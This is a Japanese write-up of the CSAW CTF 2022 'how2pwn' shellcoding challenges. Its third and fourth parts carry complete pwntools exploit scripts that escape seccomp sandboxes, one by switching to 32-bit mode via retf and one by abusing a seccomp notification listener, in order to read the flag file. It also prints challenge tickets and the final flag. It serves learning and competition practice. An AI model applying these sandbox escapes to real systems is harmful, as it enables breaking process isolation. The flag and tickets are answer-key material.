# CSAW CTF 2022 `how2pwn [pwn]` writeup
exploit codeは bin/にあります。

## 問題
how2pwn is a series of beginner-friendly pwn challenges to make pwning and shellcoding more approachable.

Servers:

`nc how2pwn.chal.csaw.io 60001`

`nc how2pwn.chal.csaw.io 60002`

`nc how2pwn.chal.csaw.io 60003`

`nc how2pwn.chal.csaw.io 60004`

シェルコードにまつわる問題を4つ解くとFLAGがもらえる。
2問目以降を解くためには、全問を解いて得られるticketが必要。
全問書いてると分量が大変なことになるので随時割愛する。
コード類も全部載せるのは冗長なので抜粋して紹介。

実行ファイルとソースコード、exploit codeのサンプル、リモート環境をエミュレートするためのDockerfile群が提供される。

## 1問目
### 解法
1問目なのでExploit codeのサンプルにほとんど答えが書いてある。
自分で埋めるのは`/bin/sh`のバイト列とシステムコール番号だけ。
シェルコード初学者にとって教育的な作りになってて好印象だった。

### Exploit
省略

FLAGを見ると2問目のexploit codeのサンプルとticketが置いてあった。

## 2問目
### 解法
入力が0x10バイトまでのシェルコード。
シェルコード実行直前のレジスタをダンプすると、`rax = 0` `rdi = 0` `rsi = buf`になっていたので、以下の数バイトのシェルコードを送るだけで`read(0, buf, 0x80)`が呼び出せる。

'''
xor rdx, rdx
mov rdx, 0x80
syscall
'''

再び標準入力を受け付けた後は、syscallのあとのメモリに1問目のコードをつぎ足してシェルを取る。

### Exploit
省略

FLAGを見ると3問目のexploit codeのサンプルとticketが置いてあった。

## 3問目
### 解法
このあたりから難しくなってくる。
文字数の制約はなくなった代わりに、いくつかのシステムコールが制限されてしまった (出力系やシェル起動するやつら全般)。
しかしながら、このsandboxにはシステムコールのアーキテクチャを確認していないという脆弱性が存在する。

方針としては、任意のアドレスをmmapシステムコールで新たに確保して、このアドレスにread()でx86のシェルコードを置く。
その後`retf`命令でx86のシェルコードにjmpしつつcsレジスタを0x23に書き換える。
すると、以降x86 archの命令を解釈するようになって無事シェルコードが続行される。
実際にはアーキテクチャが違うため、x86モードではシェルを開くことができない。
FLAGのファイル名とリポジトリを教えてくれているので、open -> read -> witeで読み出しましょう。

### Exploit
配布されたサンプルを魔改造したせいで可読性にかける。申し訳ない。

x86を経由してsandboxを抜ける手法は非常に勉強になった。
```py
from pwn import *
import sys

# context.log_level='debug'
p = remote("how2pwn.chal.csaw.io",60003)

ticket = b'8e7bd9e37e38a85551d969e29b77e1ce'
p.send(ticket)

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# 1. In this challenge, you can't open a file because of the strict sandbox
# 2. But there is a vul about the sanbox, it doesn't check the syscall arch.
# 3. We can use x86 syscalls to bypass it. All x86 syscalls: https://syscalls32.paolostivanin.com/
# 4. You may find x86 can't visite x64 address because x64 address is too long to be stored in the x86 register. However, we still have syscall_mmap, which could allocate a chunk of memory, for example 0xcafe000, so we can visite this address in x86 mode.
# 5. There is a demo for retf: https://github.com/n132/n132.github.io/blob/master/code/GoogleCTF/S2/XxX/pwn.S


context.arch = 'amd64'

shellcode = f'''
xor rax,rax
mov al, 9
mov rdi, 0xcafe000
mov rsi,0x2000
mov rdx,0x7
mov r10,0x21
xor r8,r8
xor r9,r9
syscall

xor rdi, rdi
mov rsi, 0xcafe000
mov rdx, 0x1000
xor rax, rax
syscall

mov rsi, 0x230cafe000
push rsi
'''

# gdb.attach(p)
shellcode = asm(shellcode)+b'\xcb'# \xcb is retf
p.send(shellcode.ljust(0x100,b'\0'))

context.arch='i386'
context.bits=32
flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))
shellcode=f'''
mov esp, 0xcafe500
mov eax, 0x5
push {flag_path_2}
push {flag_path_1}
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80

mov ebx, eax
mov al,0x3
mov ecx, esp
mov edx, 0x1600
int 0x80

mov ebx, 1
mov eax, 4
mov ecx, esp
mov edx, 0x1600
int 0x80

mov eax, 1
int 0x80
'''
# input()
shellcode = asm(shellcode)
print("[+] len of shellcode: "+str(len(shellcode)))

p.send(shellcode)
p.interactive()
p.close()
```
FLAGを見ると3問目のexploit codeのサンプルとticketが置いてあった。

## 4問目
### 解法
使えるシステムコールがseccomp, fork, ioctl, exitしかない。
しかしながら、サンプルコールのコメント部分にある解説によると、`seccomp(SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER,filter)`で開かれたファイルディスクリプタを作り出して、`ioctl(fd)`ですべてのシステムコールを利用可能に書き換えれば3問目に帰着できるらしい。

### Exploit
サンプルコードに頼りすぎた結果、深く理解できないままexploit成功してしまった。
要勉強。
```py
from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
debug = 0
if debug:
    p = process("./chal4")
else:
    p = remote("how2pwn.chal.csaw.io",60004)
    # p = remote("0.0.0.0",60004)
ticket = b'7a01505a0cfefc2f8249cb24e01a2890'
p.send(ticket)

# This challeneg only allows __NR_seccomp __NR_fork __NR_ioctl __NR_exit
# 1. You can find a similar challenge here: https://n132.github.io/2022/07/04/S2.html.
# 2. After reading the article, I pretty sure you know the solution.
# 3. Implement it in shellcode
# 4. For debugging, you may need this: https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
# 5. SECCOMP_IOCTL_NOTIF_SEND == 0xC0182101 & SECCOMP_IOCTL_NOTIF_RECV==0xc0502100
# 6. Memory dump while calling
# syscall(317,SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER ,&exp_prog);
# [-------------------------------------code-------------------------------------]
#    0x55555555545b <main+626>:    mov    esi,0x1
#    0x555555555460 <main+631>:    mov    edi,0x13d
#    0x555555555465 <main+636>:    mov    eax,0x0
# => 0x55555555546a <main+641>:    call   0x5555555550a0 <syscall@plt>
#    0x55555555546f <main+646>:    mov    DWORD PTR [rbp-0x118],eax
#    0x555555555475 <main+652>:    cmp    DWORD PTR [rbp-0x118],0x3
#    0x55555555547c <main+659>:    jne    0x5555555d1 <main+1000>
#    0x555555555482 <main+665>:    mov    edi,0x39
# Guessed arguments:
# arg[0]: 0x13d
# arg[1]: 0x1
# arg[2]: 0x8
# arg[3]: 0x7fffffffe4e0 --> 0x4
# [------------------------------------stack-------------------------------------]
# 0000| 0x7fffffffe4c0 --> 0x0
# 0008| 0x7fffffffe4c8 --> 0x0
# 0016| 0x7fffffffe4d0 --> 0xa ('\n')
# 0024| 0x7fffffffe4d8 --> 0x7fffffffe530 --> 0x20 (' ')
# 0032| 0x7fffffffe4e0 --> 0x4
# 0040| 0x7fffffffe4e8 --> 0x7fffffffe510 --> 0x400000020
# 0048| 0x7fffffffe4f0 --> 0x0
# 0056| 0x7fffffffe4f8 --> 0x0
# [------------------------------------------------------------------------------]
# Legend: code, data, rodata, value
# 0x000055555555546a in main ()
# gdb-peda$ stack 30
# 0000| 0x7fffffffe4c0 --> 0x0
# 0008| 0x7fffffffe4c8 --> 0x0
# 0016| 0x7fffffffe4d0 --> 0xa ('\n')
# 0024| 0x7fffffffe4d8 --> 0x7fffffffe530 --> 0x20 (' ')
# 0032| 0x7fffffffe4e0 --> 0x4
# 0040| 0x7fffffffe4e8 --> 0x7fffffffe510 --> 0x400000020
# 0048| 0x7fffffffe4f0 --> 0x0
# 0056| 0x7fffffffe4f8 --> 0x0
# 0064| 0x7fffffffe500 --> 0x2
# 0072| 0x7fffffffe508 --> 0x0
# 0080| 0x7fffffffe510 --> 0x400000020
# 0088| 0x7fffffffe518 --> 0xc000003e00010015
# 0096| 0x7fffffffe520 --> 0x7fc0000000000006
# 0104| 0x7fffffffe528 --> 0x7fff000000000006
# 0112| 0x7fffffffe530 --> 0x20 (' ')
# 0120| 0x7fffffffe538 --> 0x13d01000015
# 0128| 0x7fffffffe540 --> 0x7fff000000000006
# 0136| 0x7fffffffe548 --> 0x3901000015
# 0144| 0x7fffffffe550 --> 0x7fff000000000006
# 0152| 0x7fffffffe558 --> 0x1001000015
# 0160| 0x7fffffffe560 --> 0x7fff000000000006
# 0168| 0x7fffffffe568 --> 0x3c01000015
# 0176| 0x7fffffffe570 --> 0x7fff000000000006
# 0184| 0x7fffffffe578 --> 0x7ff0000000000006
# 0192| 0x7fffffffe580 --> 0x0
# END

# gdb.attach(p)

context.arch = 'amd64'
shellcode = f'''
    mov esp,0xcafe800
    mov rsi,0x8
    mov rbx,0x7fff000000000006
    push rbx
    mov rbx, 0x7fc0000000000006
    push rbx
    mov rbx, 0xc000003e00010015
    push rbx
    mov rbx, 0x400000020
    push rbx
    mov rbx,rsp
    push rbx
    xor rbx,rbx
    mov bl,0x4
    push rbx
    mov rdx,rsp
    mov rax, 0x13d
    mov rdi,1
    syscall

    mov r8,rax
    mov rax, 57
    syscall

    cmp rax, 0x0

    je child_process
parent_process:
    xor rax,rax
clean_req_and_resp:
    mov ecx, 0xd
    mov rdx, 0xcafec00
loop:
    mov qword ptr [rdx],rax
    dec rcx
    add dl,0x8
    cmp rcx,0
    jne loop
recv:
    mov rax,16
    mov rdi,r8
    mov rsi,0xc0502100
    mov rdx,0xcafec00
    syscall

copy_id_of_resp:
    mov rax, 0xcafec00
    mov rbx, qword ptr[rax]
    add al,0x50
    mov qword ptr[rax], rbx
set_flags_of_resp:
    add al,0x14
    mov rbx,1
    mov dword ptr[rax], ebx
resp:
    xor rax,rax
    mov al,  16
    mov rdi, r8
    mov esi, 0xc0182101
    mov edx, 0xcafec50
    syscall
    jmp parent_process

child_process:
    mov rcx,0x10000
wait_loop:
    dec rcx
    cmp rcx,0
    jne wait_loop
show_flag:
    mov rax, 0x230cafe000 + 0x180
    push rax
'''

flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))

X32_showflag =f'''
mov esp, 0xcafe300
xor eax, eax
mov eax, 0x5
push {flag_path_2}
push {flag_path_1}
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80

mov ebx, eax
mov eax, 0x3
mov ecx, esp
mov edx, 0xa00
int 0x80

mov ebx, 1
mov eax, 4
mov ecx, esp
mov edx, 0xa00
int 0x80

mov eax, 1
int 0x80
'''

shellcode = asm(shellcode)+b'\xcb'
context.arch = 'i386'
context.bits = 32
shellcode = shellcode.ljust(0x180,b'\0') + asm(X32_showflag)
context.log_level='debug'
# gdb.attach(p)
p.sendafter(": \n",(shellcode).ljust(0x1f0,b'\0')+b"/flag\0")
p.interactive()
p.close()
```

FLAG: `flag{8d13cfa357978684be9809172d3033ce739015f5}`